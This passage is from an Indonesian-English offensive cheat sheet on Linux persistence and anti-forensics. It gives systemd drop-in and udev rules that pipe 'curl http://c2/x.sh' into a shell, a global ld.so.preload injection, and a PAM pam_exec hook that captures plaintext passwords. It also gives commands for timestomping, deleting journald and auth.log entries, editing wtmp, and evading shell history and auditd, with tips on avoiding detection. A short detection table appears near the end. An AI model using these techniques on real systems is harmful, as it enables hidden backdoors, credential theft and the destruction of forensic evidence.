| `ExecStartPre=` in a legitimate unit | edit existing unit | every start | `systemctl daemon-reload` required |
| Drop-in | `/etc/systemd/system/<unit>.service.d/override.conf` | config | stealthier than a new unit |
| `.automount` | `*.automount` + mount | akses mountpoint | |

```ini
# Drop-in stealth (tidak mengubah unit asli — tidak muncul di diff)
[Service]
ExecStartPre=/bin/sh -c 'curl -s http://c2/x.sh | sh'
# atau
ExecStart=
ExecStart=/usr/local/bin/legit-looking-binary
```

**Pitfall:** `systemctl daemon-reload` triggers `inotify` on `/etc/systemd/system` on some distros (Ubuntu default auditd rule). `systemd-analyze verify` to check syntax before restarting a critical service.

### cron — varian

| Location | User | Notes |
|---|---|---|
| `/etc/cron.d/*` | `USER` field in the file | most flexible, root |
| `/etc/crontab` | field `USER` | |
| `/var/spool/cron/crontabs/<user>` | that user | `crontab -e`; don't edit directly (mtime/warning) |
| `/etc/cron.{hourly,daily,...}` | root | executable files only |
| `~/.config/systemd/user/*.timer` | user | modern alt cron |
| `anacron` | `/etc/anacrontab` | |
| `at` | `atd` queue `/var/spool/cron/atjobs/` | one-shot |

**Pitfall:** cron `%` must be escaped as `\%` in the command. `MAILTO=""` to avoid email logs. The cron daemon does not reload automatically on some distros — `touch /etc/crontab`. `cron.allow`/`cron.deny` can block per user.

### LD_PRELOAD — varian

```bash
# 1. /etc/ld.so.preload (global, root)
echo /lib/libevil.so > /etc/ld.so.preload
# 2. per-service Environment=
systemctl edit svc --force
# [Service]
# Environment=LD_PRELOAD=/tmp/x.so
# 3. ~/.bashrc export (user-level)
# 4. ExecStart wrapper
# 5. /etc/environment
```

**Pitfall:** `ld.so.preload` blocks all binaries → if the .so is broken, the system bricks. Test first: `LD_PRELOAD=/tmp/x.so ls`. SELinux `allow_execmod`/`deny_execmod`; AppArmor per-binary profiles. `ldconfig -p` does not show preload.

### udev — varian

| Lokasi | Vektor |
|---|---|
| `/etc/udev/rules.d/99-*.rules` | `RUN+=` |
| `/lib/udev/rules.d/` | overridden by `/etc` |
| `/etc/udev/scripts/` | script dipanggil rule |

```
ACTION=="add", SUBSYSTEM=="usb", RUN+="/bin/sh -c 'curl http://c2/x|sh'"
```

**Pitfall:** udev ≥ 250 does not run `RUN+=` for long-running; use `SYSTEMD_WANTS=` to service. `udevadm control --reload-rules` to apply. Rules in `/run/udev/rules.d/` are volatile (lost on reboot) — good for temporary stealth.

### PAM — backdoor

```bash
# 1. pam_exec (paling stealth — tak sentuh binary PAM)
# /etc/pam.d/sshd
# auth optional pam_exec.so quiet /usr/local/bin/check.sh
# 2. Backdoor pam_unix.so
# 3. pam_exec expose_authtok (dapat password plaintext)
# auth optional pam_exec.so quiet expose_authtok /usr/local/bin/logpass
# 4. pam_userdb inject
```

**Pitfall:** `expose_authtok` is not compatible with `try_first_pass`/`use_first_pass` in the stack — requires correct order. Debian ≥ 12 hardens `pam_exec` (requires absolute path). `pam-auth-update` on Debian/Ubuntu can overwrite `/etc/pam.d/common-*` when packages are updated — backdoor disappears. SELinux `authlogin` context.

## Anti-forensics

### Timestomp

```bash
# Referensi waktu dari file sah
touch -r /etc/passwd /tmp/x
# Access/Modify/Change terpisah
touch -a -d '2023-01-01 12:00' file
touch -m -d '2023-01-01 12:00' file
# ctime (Change) TIDAK bisa diset — hanya bisa dipalsukan via debugfs / clock manipulation
# debugfs (root, offline/single-user):
debugfs -w -R "set_inode_field /path ctime 20230101120000" /dev/sda1
# Atau ubah jam sistem + sentuh file + restore
date -s '2023-01-01 12:00'; touch file; hwclock -w; date -s '2024-...'; 
```

**Pitfall:** ctime & "birth time" (ext4 `crtime`) cannot be set from userspace. `statx()` reports btime. ext4 `crtime` is visible via `debugfs -R 'stat <inode>'`. Btrfs/XFS also have `crtime`. Journaling FS can leave traces of old ctime in the journal — `debugfs`/`xfs_db` can reveal.

### Log tamper — vektor & jebakan

| Target | Vektor | Jebakan |
|---|---|---|
| `/var/log/auth.log` | `sed -i '/IP/d'` | inode/mtime changes; rsyslog may still hold fd → writes after edit |
| journald | `journalctl --rotate`, delete `/var/log/journal/*/` | `journalctl --vacuum-time`; systemd-journald holds fd — deleting files is ineffective until restart |
| wtmp/btmp/lastlog | `utmpdump` edit then `> /var/run/utmp` | binary format; `last -f` to check |
| auditd | `auditctl -D`, stop daemon | `auditd` immutable (`-e 2`) butuh reboot |
| bash history | `HISTFILE=/dev/null`, `unset HISTFILE` | see below |
| remote syslog | forward to remote — cannot be deleted locally | detection: local logs missing but remote exist |
| `~/.bash_history` | `history -c` then `history -w` | timeline gap visible in `stat` |

```bash
# Journald — hapus jejak, tapi daemon masih pegang fd
systemctl stop systemd-journald; rm -rf /var/log/journal/*; systemctl start systemd-journald
# rsyslog — edit aman (stop dulu)
systemctl stop rsyslog; sed -i '/attacker/d' /var/log/auth.log; systemctl start rsyslog
# utmp/wtmp edit
utmpdump /var/log/wtmp > /tmp/wtmp.txt
# edit, lalu:
utmpdump -r /tmp/wtmp.txt > /var/log/wtmp
```

**Pitfall:** auditd with `-e 2` (immutable) → cannot be changed until reboot. `augenrules` regenerating config on restart can restore rules. Remote logs (SIEM) cannot be tampered with → pastebin first, delete, still detected. Wazuh/OSSEC FIM detects mtime/inode changes on log files.

### History evasion

```bash
# Per-sesi
unset HISTFILE
export HISTSIZE=0
set +o history
# Space di depan command (HISTCONTROL=ignorespace)
 HISTIGNORE=' *'
# Manipulasi HISTFILE
HISTFILE=/dev/null
# Timestamp spoof
HISTTIMEFORMAT='' ; history -c
# Clear + hilangkan gap
history -c; history -w
# Hapus command spesifik
history -d <offset>
```

**Pitfall:** `PROMPT_COMMAND` can log to syslog (`logger`). Bash `shopt -s histappend` → `history -c` alone is not enough. Zsh: `HISTFILE`, `SAVEHIST`, `setopt HIST_IGNORE_SPACE` differ. Fish: `fish_history` in `~/.local/share/fish/`. `sudo` commands are logged in `/var/log/auth.log` regardless of user history.

### Auditd / eBPF — bypass awareness

```bash
# auditctl lihat rule
auditctl -l
# Jika -e 2 (immutable): reboot untuk ubah
# eBPF (Falco/Tetragon) — detection runtime, bukan pencegahan
bpftool prog list    # cek tracer
# Bypass: hindari syscall yang di-trace (mis. pakai syscall langsung), atau unload jika root
```

## Summary table: persistent indicators per technique

| Technique | Typical artifacts | Detection |
|---|---|---|
| systemd drop-in | file in `*.service.d/` | `systemd-analyze` diff, FIM |
| `ld.so.preload` | file global | `ldconfig` tak lihat; cat file |
| PAM backdoor | `common-auth` mtime | `pam-auth-update` reset |
| udev rule | `/etc/udev/rules.d/*.rules` | `udevadm test` |
| SSH agent hijack | socket dir milik user lain diakses | `ss -xp \| grep ssh` |
| cron | entry in `crontab -l` / `cron.d` | audit rule on `/var/spool/cron` |
| timestomp | ctime ≠ mtime | `statx` btime, debugfs |

## Common operational pitfalls

- **`CAP_SYS_ADMIN`/`CAP_SYS_PTRACE`** sering diasumsikan ada; cek `capsh --print` — container sering hilangkan.
- **`/proc/PID/mem`** requires `ptrace_scope=0` or CAP_SYS_PTRACE; Yama default `1`.
- **AppArmor/SELinux** memblok akses `/proc/*/mem`, `ld.so.preload`, `pam_exec` meski root.
- **`/etc/shadow` mode 0000** on newer Ubuntu — read via `getent shadow` (requires root).
- **`/tmp` systemd `PrivateTmp=true`** isolation per service — sockets/agents in `/tmp` are not visible across services.
- **`hidepid=2`** on `/proc` → `ps eww` for other users is empty.
- **`kptr_restrict=2`** → kernel symbols in `/proc/kallsyms` are zeroed.
- **Container**: `/proc/kcore`, `/proc/1/root`, `nsenter` sering terblok seccomp; cek `capsh --print`, `/proc/self/status` `Seccomp:`.
- **`auditd immutable`** — do not edit log files without checking `auditctl -s` first; `enabled=2` cannot be reversed.
- **`journald volatile`** (`/run/log/journal`) — logs lost on reboot; tampering not needed.
- **NTP/chrony** — clock manipulation for timestomp can trigger synchronization alerts and break `crtime`/`btime` consistency.
- **FIM (AIDE/Wazuh/OSSEC)** detects mtime/inode/hash — timestomp is not enough for hashed files; touching a file with identical content does not help either.


---

## [reasoning trace]


